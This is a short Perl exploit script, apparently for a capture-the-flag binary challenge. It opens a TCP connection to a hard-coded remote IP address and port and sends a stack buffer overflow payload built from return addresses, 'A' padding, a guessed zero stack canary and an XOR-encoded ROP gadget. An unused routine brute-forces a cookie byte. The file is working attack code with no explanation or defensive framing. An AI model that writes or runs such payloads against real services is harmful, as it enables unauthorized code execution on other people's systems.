#!/usr/bin/perl


use strict;
use warnings;
use IO::Socket::INET;

my $func = shift || 1;

overflow();

#guess_cookie();



sub overflow {
    my $sock = connect_to_serv();
    my $BUFF_SIZE = 0xc0-4;
    my $buff;

    $buff .= pack("L", 0x0804a5ce); # ret
    $buff .= pack("L", 0x0804884b);
    $buff .= pack("L", 0x44444444);
    $buff .= pack("L", 4);
    $buff .= pack("L", 0x0805f0c0);
    $buff .= pack("L", 0x100);

    for(1..($BUFF_SIZE - length($buff))) {
        $buff .= "A";
    }

    $buff .= pack("L", 0x0);  # canary
    $buff .= pack("L", 0x44444444)x3; # padding

    $buff .= pack("L", 0x080578f5 ^ 0x08056afa); # pop 3
    $buff .= pack("L", 0x44444444);   # dummy
    $buff .= pack("L", 0xd7 ^ 0x1); # count

    print $sock $buff;

    print while(<$sock>);
}

sub guess_cookie {
    my $byte = shift;

    for(my $i = 0; $i < 0x1; $i++) {

        my $sock = connect_to_serv();
        my $buff .= call_function(0x93);

        for(2..buff_size(0x93)) {
            $buff .= "A";
        }


       #  $buff .= "A"x4;
        #$buff .= "\xcd";

        print $sock $buff;

        close $sock;
    }
}


sub connect_to_serv {

    return IO::Socket::INET->new(
        #PeerAddr => '127.0.0.1',
        PeerAddr  => '54.152.37.20',
        PeerPort => 24242,
        Proto => 'tcp') || die $@;
}

sub buff_size {
    my $func = shift;

    return (0x84 - (0x32 - $func)*4) & 0xFF;
}


sub call_function {
    my ($func) = shift;

    return chr(($func - 0x32) & 0xFF);
}
